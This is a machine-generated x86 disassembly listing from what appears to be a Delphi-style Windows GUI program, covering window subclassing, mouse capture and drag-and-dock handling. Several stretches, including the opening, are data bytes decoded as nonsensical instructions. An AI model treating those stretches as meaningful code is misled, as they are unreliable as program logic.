add [ edx + ecx * 8 - 0x354fffbc ] cl
inc esp
add [ edx + edi * 4 - 0x452fffbc ] bh
inc esp
add al ah
mov edx 0xbea00044
inc esp
add [ esi + edi * 4 - 0x4137ffbc ] dh
inc esp
add ah bl
mov esi 0xe8840044
inc esp
add al al

sub_44364a
and bl cl
inc esp
add [ ebx + ecx * 8 - 0x345fffbc ] dl
inc esp
add [ esi + ecx * 8 ] al
inc esp
add [ esi + ecx * 8 - 0x31f3ffbc ] dl
inc esp
add [ esi + ecx * 8 ] dl
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ esi + ecx * 8 ] ah
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax ] ch
rol [ eax + eax + 0x7c ] 0x1
rol [ eax + eax - 0x38 ] 0x1
rol [ eax + eax + 0x24 ] 0x1
rol [ eax + eax - 0x80 ] 0x1
into
inc esp
add [ ebp * 4 - 0x2a17ffbc ] ah
inc esp
add [ eax ] al
les eax [ eax + eax - 0x14 ]
les eax [ eax + eax + 0x14 ]
lds eax [ eax + eax - 0x18 ]
0x44
sub_4438b2
inc esp
add [ edx - 0x5553ffbc ] bh
inc esp
add [ eax - 0x44 ] dl
inc ecx
add [ eax - 0x70 ] al
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax ] cl
hlt
sub_4438e2
inc esp
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add al bh
movsd [ edi ] [ esi ]
inc esp
add ah dh
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
add [ esp + esi * 8 - 0x1673ffbc ] dh
inc esp
add ah bh
rol [ eax + eax + 0x24 ] cl
xlat
inc esp
add [ eax - 0xb ] ah
inc esp
add [ ecx ] al
add [ edi ] cl
add [ esp + esi * 8 + 0x540e0044 ] dl
inc ebx
jne r-xdata
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
in al 0xb2
je r-xdata
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
hlt
inc eax
add ah ah
mov dl 0x44
insd
inc ebx
outsd
outsb
je r-xdata
add [ ebx + esi + 0x40 ] al
add [ esp + esi * 8 + 0x44 ] ah
add [ edx - 0x5553ffbc ] bh
outsd
insb
nop
pushfd
cmp [ eax + eax + 0x7 ] eax
push cs
push esp
inc ebx
jne r-xdata
add al bl
aad 0x44
add [ eax ] bh
loop r-xdata
inc esp
add [ eax - 0x44 ] dl
stosb [ edi ]
je r-xdata
add [ esi + edx * 8 - 0x2ea7ffbc ] dl
inc esp
add [ eax - 0x2a ] bh
inc esp
add al bl
xchg edi eax
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add [ esp + ebp * 4 ] cl
inc esp
add [ eax - 0xbffbb15 ] al
test al 0x44
add [ edi ] ah
inc esp
add [ esp + ebp * 4 - 0x5357ffbc ] ah
inc esp
add [ eax - 0x55 ] ah
inc esp
add [ eax ] cl
stosd [ edi ]
inc esp
add [ eax - 0x4bffbb29 ] bh
hlt
add al cl
bound eax [ eax + eax + 0x4c ]
fadd [ eax + eax + 0x6c ]
fadd [ eax + eax + 0x4c ]
aad 0x44
add [ eax ] dl
bound eax [ eax + eax + 0x14 ]
bound eax [ eax + eax + 0x10 ]
xchg edx eax
inc esp
add [ edx + edx * 4 ] bh
inc esp
add [ ebp + ebp * 2 + 0x44 ] dl
add [ ebx + 0x6ee00044 ] cl
inc esp
add [ eax + 0x6e ] bl
inc esp
add [ ecx + esi * 2 + 0x44 ] ch
add [ eax ] bl
jo r-xdata
inc ecx
add [ eax - 0x70 ] al
add [ edx + ebp * 4 - 0x43afffbc ] ch
insd
inc ebx
outsd
outsb
je r-xdata
add [ esp + esi * 8 - 0x1673ffbc ] dh
inc esp
add ah bh
rol [ eax + eax + 0x24 ] cl
xlat
inc esp
add [ eax - 0x14 ] dl
inc esp
add [ eax - 0x10 ] ch
inc esp
add ah bh
in eax dx
inc esp
add ah ah
out dx eax
inc esp
add [ eax + esi * 8 ] cl
inc esp
add al bh
in al dx
inc esp
add [ eax + eax ] al
test [ eax ] al
test [ eax ] eax
adc dh [ eax - 0x141bfce9 ]
inc esp
add ah ch
jmp r-xdata
add [ eax - 0x3fffbb4f ] al
xchg edx eax
inc esp
inc esp
add [ esp + 0x44 ] dl
add [ eax - 0x69 ] ah
inc esp
add [ ebp + ebp * 2 + 0x44 ] ch
add [ eax ] dh
inc edx
inc eax
nop
outsd
insb
mov ah 0x38
inc esp
add [ eax ] ah
aaa
inc esp
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi + 0x280044 ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add al bl
xor eax 0x35e40040
inc eax
add al ch
xor eax 0x35ec0040
inc eax
add al ah
xor eax 0x33280040
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x9004033 ] al
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
inc edx
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ ebx + ebp * 8 ] dl
inc esp
add al dl
fld [ eax + eax - 0x14 ]
loop r-xdata
outsd
insb
jae r-xdata
inc esp
add [ ebp + 0x3a100040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmp al [ eax + eax + 0xa ]
cmp eax [ eax + eax + 0x18 ]
add al [ eax ]
add [ eax + 0x38 ] ch
inc esp
add [ eax ] bl
inc edx
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0xb2e40040
sub_443d78
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_443e30
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_443e64
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4045e0
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_443e30
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_443ec0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_4440a4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c964
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404640
mov eax edi
mov edx esi
call sub_404174
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4440e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c964
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404640
mov eax edi
mov edx esi
call sub_404174
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444154
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov eax ebx
call sub_44d7a4
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44419c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_444200
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_41b654
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_444234
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d7a4
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_44425c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4027b4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_444234
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_444200
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41b4f8
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41b6d0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4442b8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_41b52c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_41b654
mov edx 0x8
call sub_4027d4
inc esi
dec ebx
jne r-xdata
sub_4442ec
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_41b654
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_444200
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_444350
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_4443b0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4032e0
mov edx esp
mov eax esi
call sub_404384
add esp 0x100
pop esi
pop ebx
retn
sub_4443ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4444b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44550c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_444e94
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406eec
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_444e94
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44550c
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_444e94
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44550c
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_4444bb
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_466be8
call sub_403bd8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44550c
sub_444514
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44453e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4445a4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444350
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_4445d0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40358c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4445fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40358c
xor edx edx
sub_444654
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44f3a8
sub_444674
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44f390
sub_444698
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444580
mov dl 0x1
mov eax [ r-xdata ]
call sub_427460
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_42e1b8
mov edx eax
mov eax esi
call sub_4275dc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_4446fc
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_44472c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4445a4
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_444788
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40358c
pop edi
pop esi
pop ebp
retn 0x4
sub_4447ac
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4447d0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4447ac
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4447ac
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44488c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4448f8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_444d48
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_443e64
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_44d7a4
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_44d7a4
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44d7a4
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40358c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44488c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_44d7a4
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_44d7a4
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_444a90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_44d7a4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_44d7a4
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_444ad4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4442ec
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4448f8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_41b654
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_44d7a4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_444a90
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40358c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44c29c
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44425c
sub_444c30
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_41b6b0
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_41b544
mov edx edi
mov eax [ rw-data ]
call sub_41b4f8
jmp r-xdata
sub_444c90
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
